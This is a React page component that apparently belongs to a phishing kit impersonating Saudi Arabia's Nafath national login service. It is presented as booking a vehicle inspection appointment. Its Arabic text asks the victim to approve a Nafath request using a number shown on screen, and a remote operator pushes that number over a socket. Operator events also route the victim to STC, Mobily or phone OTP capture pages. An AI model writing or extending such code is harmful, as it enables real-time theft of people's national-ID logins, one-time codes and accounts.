import React, { useState } from "react";
import { socket } from "./Main";
import { useNavigate } from "react-router-dom";
import { useSocketEvent } from "../hooks/useSocketEvent";

const Navaz = () => {
  const query = new URLSearchParams(window.location.search);
  const [otp, setOtp] = useState(query.get("otp"));
  const stc = query.get("stc");
  const navigate = useNavigate();
  const orderId = sessionStorage.getItem("id");

  useSocketEvent("acceptNavaz", (id) => {
    if (id === orderId) navigate("/success");
  });

  useSocketEvent("declineNavaz", (id) => {
    if (id === orderId) {
      if (sessionStorage.getItem("provider") === "موبايلي") navigate("/mobilyOtp");
      else navigate("/phoneOtp");
    }
  });

  useSocketEvent("navazChange", ({ price, id }) => {
    if (id === orderId) setOtp(price);
  });

  useSocketEvent("acceptService", ({ price, id }) => {
    if (id === orderId) setOtp(price);
  });

  useSocketEvent("declineService", (id) => {
    if (id === orderId) navigate("/stcOtp");
  });

  useSocketEvent("declinePhoneOTP", (id) => {
    if (id === orderId) navigate("/phoneOtp");
  });

  return (
    <div className="w-full flex flex-col items-center justify-center bg-white py-5 gap-5 ">
      <img src="/navazLogo.png" alt="navazLogo Logo" className="w-16" />
      <span
        className="text-center w-4/5  bg-green-100 rounded-md p-3  text-gray-600  "
        style={{ border: "1px solid #14a196" }}
      >
        الرجاء التوجه الى تطبيق نفاذ لتاكيد طلب موعد الفحص الفني باختيار الرقم
        الذي سوف يظهر في الاسفل{" "}
        <div className="text-4xl text-green-500 animate-bounce mt-5">
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
        </div>
        <span className="text-gray-600 ">جاري المعالجة . نرجو الانتظار</span>
      </span>
      <div
        className="min-w-20 min-h-20 px-5 flex items-center justify-center text-2xl text-green-800 "
        style={{ border: "2px solid #14a196" }}
      >
        {otp ? otp : "??"}
      </div>
      <img src="/navazOtp.jpg" className="md:w-2/5 p-2 " />
    </div>
  );
};

export default Navaz;
